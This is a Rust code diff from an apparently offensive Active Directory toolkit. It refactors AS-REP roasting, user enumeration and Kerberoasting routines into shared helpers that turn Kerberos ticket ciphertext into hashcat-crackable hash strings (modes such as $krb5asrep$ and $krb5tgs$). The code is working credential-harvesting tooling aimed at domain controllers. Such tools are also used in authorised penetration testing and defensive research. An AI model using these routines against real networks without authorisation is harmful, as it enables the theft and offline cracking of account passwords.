@@ -353,6 +353,43 @@ pub fn build_ap_req_bytes(
     Ok(ap_req.build())
 }
 
+fn hashcat_checksum_len(etype: i32) -> usize {
+    if etype == ETYPE_RC4_HMAC { 16 } else { 12 }
+}
+
+fn format_asrep_hash_string(etype: i32, username: &str, realm: &str, cipher: &[u8]) -> String {
+    let (checksum, edata2) =
+        cipher.split_at(std::cmp::min(hashcat_checksum_len(etype), cipher.len()));
+    format!(
+        "$krb5asrep${}${}@{}:{}${}",
+        etype,
+        username,
+        realm,
+        hex::encode(checksum),
+        hex::encode(edata2),
+    )
+}
+
+fn format_tgs_hash_string(
+    etype: i32,
+    username: &str,
+    realm: &str,
+    target_spn: &str,
+    cipher: &[u8],
+) -> String {
+    let (checksum, edata2) =
+        cipher.split_at(std::cmp::min(hashcat_checksum_len(etype), cipher.len()));
+    format!(
+        "$krb5tgs${}$*{}${}${}*${}${}",
+        etype,
+        username,
+        realm,
+        target_spn,
+        hex::encode(checksum),
+        hex::encode(edata2),
+    )
+}
+
 /// Try to parse a KDC response as KRB-ERROR and return a meaningful error
 fn parse_krb_error(data: &[u8]) -> OverthroneError {
     match KrbError::parse(data) {
@@ -444,27 +481,12 @@ pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<Cr
             let enc_part = &as_rep.enc_part;
             let cipher = &enc_part.cipher;
 
-            // Hashcat mode 18200 format:
-            // $krb5asrep$23$user@realm:<checksum_32hex>$<edata2_hex>
-            // RC4: checksum = first 16 bytes; AES256: first 12 bytes
-            let cksum_len = if enc_part.etype == ETYPE_RC4_HMAC {
-                16
-            } else {
-                12
-            };
-            let (checksum, edata2) = cipher.split_at(std::cmp::min(cksum_len, cipher.len()));
-            let hash_string = format!(
-                "$krb5asrep${}${}@{}:{}${}",
-                enc_part.etype,
-                username,
-                realm,
-                hex::encode(checksum),
-                hex::encode(edata2),
-            );
+            let hash_string =
+                format_asrep_hash_string(enc_part.etype, clean_username, &realm, cipher);
 
-            info!("AS-REP hash obtained for {username}");
+            info!("AS-REP hash obtained for {clean_username}");
             Ok(CrackableHash {
-                username: username.to_string(),
+                username: clean_username.to_string(),
                 domain: domain.to_string(),
                 spn: None,
                 hash_type: HashType::AsRepRoast,
@@ -522,20 +544,8 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
     if let Ok((_, as_rep)) = AsRep::parse(&response_bytes) {
         let enc_part = &as_rep.enc_part;
         let cipher_data = &enc_part.cipher;
-        let cksum_len = if enc_part.etype == ETYPE_RC4_HMAC {
-            16
-        } else {
-            12
-        };
-        let (checksum, edata2) = cipher_data.split_at(std::cmp::min(cksum_len, cipher_data.len()));
-        let hash_string = format!(
-            "$krb5asrep${}${}@{}:{}${}",
-            enc_part.etype,
-            clean_username,
-            realm,
-            hex::encode(checksum),
-            hex::encode(edata2),
-        );
+        let hash_string =
+            format_asrep_hash_string(enc_part.etype, clean_username, &realm, cipher_data);
         return UserEnumStatus::ValidNoPreauth(CrackableHash {
             username: clean_username.to_string(),
             domain: domain.to_string(),
@@ -628,7 +638,7 @@ pub async fn request_tgt(
                     ticket: as_rep.ticket,
                     session_key: enc_part.key.keyvalue.clone(),
                     session_key_etype: enc_part.key.keytype,
-                    client_principal: username.to_string(),
+                    client_principal: clean_username.to_string(),
                     client_realm: current_realm,
                     end_time: Some(enc_part.endtime),
                 });
@@ -736,35 +746,13 @@ pub async fn kerberoast(
     let enc_part = &tgs_rep.ticket.enc_part;
     let cipher = &enc_part.cipher;
 
-    let hash_string = match enc_part.etype {
-        ETYPE_RC4_HMAC => {
-            // RC4: 16-byte HMAC-MD5 checksum + encrypted data
-            let (checksum, edata2) = cipher.split_at(std::cmp::min(16, cipher.len()));
-            format!(
-                "$krb5tgs${}$*{}${}${}*${}${}",
-                enc_part.etype,
-                tgt.client_principal,
-                realm,
-                target_spn,
-                hex::encode(checksum),
-                hex::encode(edata2),
-            )
-        }
-        etype => {
-            // AES256 (18), AES128 (17), or other: 12-byte HMAC-SHA1-96 checksum.
-            // The `*` wraps the full user$realm$spn block, identical to RC4 layout.
-            let (checksum, edata2) = cipher.split_at(std::cmp::min(12, cipher.len()));
-            format!(
-                "$krb5tgs${}$*{}${}${}*${}${}",
-                etype,
-                tgt.client_principal,
-                realm,
-                target_spn,
-                hex::encode(checksum),
-                hex::encode(edata2),
-            )
-        }
-    };
+    let hash_string = format_tgs_hash_string(
+        enc_part.etype,
+        &tgt.client_principal,
+        realm,
+        target_spn,
+        cipher,
+    );
 
     info!(
         "Kerberoast hash for {target_spn} (etype: {})",
@@ -1079,6 +1067,7 @@ pub fn krb_error_to_string(code: i32) -> &'static str {
         24 => "KDC_ERR_PREAUTH_FAILED - Pre-auth failed (wrong password/hash)",
         25 => "KDC_ERR_PREAUTH_REQUIRED - Pre-auth required",
         31 => "KRB_AP_ERR_SKEW - Clock skew too great",
+        36 => "KRB_AP_ERR_BADMATCH - Ticket and authenticator do not match",
         32 => "KRB_AP_ERR_BADADDR - Incorrect network address",
         37 => "KRB_AP_ERR_MODIFIED - Message stream modified",
         41 => "KRB_ERR_RESPONSE_TOO_BIG - Response too big for UDP",
